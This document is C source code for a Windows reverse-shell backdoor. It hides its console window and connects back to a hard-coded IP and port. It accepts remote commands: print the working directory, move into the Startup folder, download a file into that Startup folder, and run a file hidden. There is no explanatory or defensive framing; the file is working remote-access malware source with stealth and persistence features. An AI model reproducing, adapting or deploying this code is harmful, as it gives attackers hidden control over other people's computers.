#include <stdio.h> 
#include <winsock2.h>       //Socket connection    
#include <ws2tcpip.h>       //TCP-IP Sockets   
#include <windows.h>         //WinApi calls    
#include "urlmon.h"

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Ws2_32.lib") 
#define DEFAULT_BUFFER_LEN 1024

void exec(char* rval, int rsize, char *file_exec)
{
    if (32 >= (int)(ShellExecute(NULL,"open", file_exec, NULL, NULL, SW_HIDE)))
    {
        strcat(rval, "[x] Error\n");
    }
    else
    {
        strcat(rval, "\n");
    }
}

void ChangeDirectory()
{
    SetCurrentDirectory("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
}

void DownloadFile()
{
    int hr;
    hr = URLDownloadToFile (NULL,"http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2012/n3337.pdf", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp", 0, NULL);
}


void Pwd(char* rval, int rsize) 
{
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(rval, tempvar);
} 

void Reverse_Shell()
{
    WSADATA ws;
    WSAStartup(MAKEWORD(2,2), &ws);
    SOCKET sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr("192.168.0.227");     //ip to connect back to HOST machine (your local IP)
    address.sin_port = htons(8080); //PORT to connect back to 

    if(connect(sock, (SOCKADDR*)&address, sizeof(address))==SOCKET_ERROR) 
    {
        closesocket(sock);
        WSACleanup();
        exit(0);
    }

    else 
    {
        char Command_received[DEFAULT_BUFFER_LEN] = "";
        while (true)
        {
            int Result = recv(sock, Command_received, DEFAULT_BUFFER_LEN, 0);
            if ((strcmp(Command_received, "pwd") == 0)) 
            {
                char buffer[257] = "";
                Pwd(buffer,257);
                strcat(buffer, "\n");
                send(sock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(Command_received, 0, sizeof(Command_received));
            }    

            else if ((strcmp(Command_received, "cd") == 0)) 
            {
                
                char buffer[257] = "";
                ChangeDirectory();
                strcat(buffer, "\n");
                send(sock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(Command_received, 0, sizeof(Command_received));
            }   

            else if ((strcmp(Command_received, "download") == 0)) 
            {
                
                char buffer[257] = "";
                DownloadFile();
                strcat(buffer, "\n");
                send(sock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(Command_received, 0, sizeof(Command_received));
            } 

            else 
            {
                char splitval[DEFAULT_BUFFER_LEN] = "";
                for(int i=0; i<(*(&Command_received + 1) - Command_received); ++i)
                {
                    if (Command_received[i] == *" ")    //Command_received[i] is a pointer here and can only be compared with a integer, this *" "
                    {
                        break;
                    }
                    else
                    {
                        splitval[i] = Command_received[i];
                    }
                }

                if ((strcmp(splitval, "exec") == 0)) 
                {
                    char CommandExec[DEFAULT_BUFFER_LEN] = "";
                    int j = 0;
                    for(int i=5; i<(*(&Command_received + 1) - Command_received); ++i)
                    {
                        CommandExec[j] = Command_received[i];
                        ++j;
                    }
                    char buffer[257] = "";
                    exec(buffer, 257, CommandExec);
                    strcat(buffer, "\n");
                    send(sock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(Command_received, 0, sizeof(Command_received));
                }

                else 
                {
                    char buffer[20] = "Invalid Command\n";
                    send(sock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(Command_received, 0, sizeof(Command_received));
                }
            }
        }
    }
    closesocket(sock);
    WSACleanup();
    exit(0);
}

int main()
{
    HWND show_hide;
    AllocConsole();
    show_hide=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(show_hide,0);
    Reverse_Shell();
    return 0;
}

